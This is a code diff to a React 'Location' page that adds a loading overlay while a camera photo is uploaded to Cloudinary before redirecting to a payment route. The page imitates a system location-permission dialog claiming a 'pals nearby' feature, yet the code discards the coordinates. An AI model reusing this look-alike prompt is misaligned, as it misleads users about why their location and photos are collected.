@@ -1,11 +1,13 @@
-import { useContext} from "react";
+import { useContext, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import Reusablespinz from "../Components/Reusablespinz";
 import "../Css/location.css";
 import { ImageContext } from "../App";
+
 function Location() {
     const navigate = useNavigate();
-    const {image, setimage} = useContext(ImageContext);
+    const { image, setimage } = useContext(ImageContext);
+    const [loading, setLoading] = useState(false); // 👈 Loading state added
 
     const checkPermissionAndGetLocation = async () => {
         try {
@@ -21,16 +23,16 @@ function Location() {
         }
     };
 
-
     const getLocation = () => {
+        setLoading(true); // 👈 Start loading
+
         navigator.geolocation.getCurrentPosition(
             (position) => {
-                // console.log("Latitude:", position.coords.latitude);
-                // console.log("Longitude:", position.coords.longitude);
                 openCameraApp();
             },
             (error) => {
                 console.log("An error occurred:", error);
+                setLoading(false); // 👈 Stop loading if error
             }
         );
     };
@@ -45,37 +47,47 @@ function Location() {
         cameraInput.addEventListener("change", async (event) => {
             const file = event.target.files[0];
             if (!file) {
+                setLoading(false); // 👈 Stop loading if no file
                 return;
             }
-        
+
             const formdata = new FormData();
             formdata.append("file", file);
             formdata.append("upload_preset", "cavin_kart");
             formdata.append("cloud_name", "dl0qctpk2");
-        
+
             try {
                 const res = await fetch("https://api.cloudinary.com/v1_1/dl0qctpk2/image/upload", {
                     method: "POST",
                     body: formdata,
                 });
-        
+
                 const pen = await res.json();
-                // console.log(pen.url);
-                setimage(pen.url)
-        
-                // After capturing image, redirect to /pay
+                setimage(pen.url);
                 setTimeout(() => {
+                    setLoading(false); // 👈 Stop loading before navigating
                     navigate("/pay");
                 }, 1000);
             } catch (error) {
                 console.error("Cloudinary upload failed:", error);
+                setLoading(false); // 👈 Stop loading if upload fails
             }
         });
-    }        
+    };
 
     return (
         <div>
             <Reusablespinz />
+
+            {/* ✅ Loading Overlay */}
+            {loading && (
+                <div className="fixed top-0 left-0 w-full h-full bg-black bg-opacity-50 flex justify-center items-center z-50">
+                    <div className="text-white text-lg animate-pulse">
+                        Opening camera...
+                    </div>
+                </div>
+            )}
+
             <div>
                 <div className="bg-opacity-60 flex justify-center items-center bg-slate-700" id="location">
                     <div className="bg-[#1E1E1EBF] w-[270px] h-[440px] text-white rounded-[14px]">
@@ -84,7 +96,8 @@ function Location() {
                                 Allow “Diary” to use your <span className="ml-20">location?</span>
                             </h1>
                             <p className="text-[13px] font-medium">
-                                Turning on location services allows us <span className="ml-3">to show you when pals are nearby.</span>
+                                Turning on location services allows us{" "}
+                                <span className="ml-3">to show you when pals are nearby.</span>
                             </p>
                         </div>
 
